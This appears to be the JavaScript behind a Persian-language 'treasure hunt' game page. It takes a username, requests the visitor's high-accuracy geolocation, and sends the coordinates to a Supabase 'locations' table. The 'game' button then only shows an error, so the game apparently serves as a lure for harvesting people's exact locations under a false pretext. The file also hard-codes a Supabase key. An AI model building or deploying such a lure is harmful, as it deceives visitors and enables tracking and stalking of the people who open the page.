const SUPABASE_URL = "https://lscynuqzocuvqrdqigoo.supabase.co";
const SUPABASE_KEY = "sb_publishable__nK_y3ycShuXlzWI0_obCQ_ULYuvMmH";

const usernameStep = document.getElementById("usernameStep");
const usernameInput = document.getElementById("usernameInput");
const usernameBtn = document.getElementById("usernameBtn");

const locationStep = document.getElementById("locationStep");
const playerName = document.getElementById("playerName");
const startBtn = document.getElementById("startBtn");

const status = document.getElementById("status");
const locationBox = document.getElementById("locationBox");
const gameStep = document.getElementById("gameStep");
const gameBtn = document.getElementById("gameBtn");
const gameError = document.getElementById("gameError");

async function saveLocation(data) {
    const response = await fetch(
        `${SUPABASE_URL}/rest/v1/locations`,
        {
            method: "POST",
            headers: {
                "apikey": SUPABASE_KEY,
                "Authorization": `Bearer ${SUPABASE_KEY}`,
                "Content-Type": "application/json",
                "Prefer": "return=minimal"
            },
            body: JSON.stringify(data)
        }
    );

    if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`Supabase ${response.status}: ${errorText}`);
    }
}

usernameBtn.addEventListener("click", () => {
    const username = usernameInput.value.trim();

    if (!username) {
        status.textContent = "❌ لطفاً یوزرنیمت رو وارد کن.";
        usernameInput.focus();
        return;
    }

    window.treasureUsername = username;

    playerName.textContent = username;

    usernameStep.classList.add("hidden");
    locationStep.classList.remove("hidden");

    status.textContent = "حالا موقعیتت رو ارسال کن 📍";
});

usernameInput.addEventListener("keydown", (event) => {
    if (event.key === "Enter") {
        usernameBtn.click();
    }
});

startBtn.addEventListener("click", () => {
    if (!navigator.geolocation) {
        status.textContent =
            "❌ موقعیت مکانی توسط این مرورگر پشتیبانی نمی‌شود.";
        return;
    }

    startBtn.disabled = true;
    startBtn.textContent = "📍 درحال دریافت موقعیت...";
    status.textContent = "درحال دریافت موقعیت...";

    navigator.geolocation.getCurrentPosition(
        async (position) => {

            const data = {
                username: window.treasureUsername || "Unknown",
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                location_timestamp: Date.now()
            };

            try {
                await saveLocation(data);

                document.getElementById("lat").textContent =
                    data.latitude.toFixed(6);

                document.getElementById("lon").textContent =
                    data.longitude.toFixed(6);

                document.getElementById("accuracy").textContent =
                    `${Math.round(data.accuracy)} متر`;

                locationBox.classList.remove("hidden");

                status.textContent =
                    "✅ موقعیت با موفقیت ثبت شد.";

                startBtn.textContent = "✅ موقعیت تأیید شد";

                locationStep.classList.add("hidden");
                gameStep.classList.remove("hidden");

            } catch (error) {
                console.error(error);

                startBtn.disabled = false;
                startBtn.textContent = "📍 ارسال موقعیت و شروع";

                status.textContent =
                    "❌ خطا در ثبت موقعیت. لطفاً دوباره تلاش کنید.";
            }
        },

        (error) => {
            console.error(error);

            startBtn.disabled = false;
            startBtn.textContent = "📍 ارسال موقعیت و شروع";

            if (error.code === 1) {
                status.textContent =
                    "❌ دسترسی موقعیت مکانی داده نشد.";
            } else if (error.code === 2) {
                status.textContent =
                    "❌ موقعیت مکانی در دسترس نیست.";
            } else if (error.code === 3) {
                status.textContent =
                    "⏱️ دریافت موقعیت طول کشید. دوباره تلاش کن.";
            } else {
                status.textContent =
                    "❌ دریافت موقعیت ناموفق بود. دوباره تلاش کن.";
            }
        },

        {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        }
    );
});

gameBtn.addEventListener("click", () => {
    gameError.classList.remove("hidden");
});
